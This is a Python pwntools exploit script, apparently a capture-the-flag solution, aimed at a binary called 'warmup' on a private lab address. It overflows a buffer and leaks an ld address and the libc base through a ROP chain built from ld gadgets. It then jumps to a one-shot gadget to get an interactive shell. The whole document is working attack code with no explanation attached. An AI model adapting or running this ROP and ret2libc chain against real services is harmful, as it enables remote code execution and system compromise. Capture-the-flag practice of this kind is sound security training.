#!/usr/bin/env python3

"""
This is Version 2 Exploit Code
"""

from pwn import *

p = remote("172.18.0.2", 10001)
e = ELF("./warmup")
libc = ELF("./libc.so.6")

#context.log_level = 'debug'

padding = b"\x00" * 0x38    # For oneshot gadget condition :: [rsp + 0x70] == NULL
comeback = 0x40053d

payload = padding
payload +=  p64(comeback)

for i in range(16):
    p.sendafter("> ", payload)

payload = padding
payload += p64(e.plt['write'])
payload += p64(e.plt['read'])

p.sendafter("> ", payload)
p.recvn(0xa0)
ld = u64(p.recvn(8))
log.info(f"ld address: {hex(ld)}")

payload = p64(comeback) * 0x10
p.send(payload)

rdi = 0x00000000000017fb + ld
rsi = 0x00000000000012a9 + ld
rdx_rbx = 0x000000000000119f + ld

payload = padding
payload += p64(rdi) + p64(0x1)
payload += p64(rsi) + p64(e.got['write'])
payload += p64(rdx_rbx) + p64(0x8) + p64(0x0)
payload += p64(e.plt['write'])
payload += p64(comeback)

p.sendafter("> ", payload)
libc.address = u64(p.recvn(0x8)) - libc.sym['write']
log.info(f"libc.address: {hex(libc.address)}")
oneshot = [0x4f3d5, 0x4f432, 0x10a41c]

payload = padding
payload += p64(libc.address + oneshot[2])
p.sendafter("> ", payload)

p.interactive()
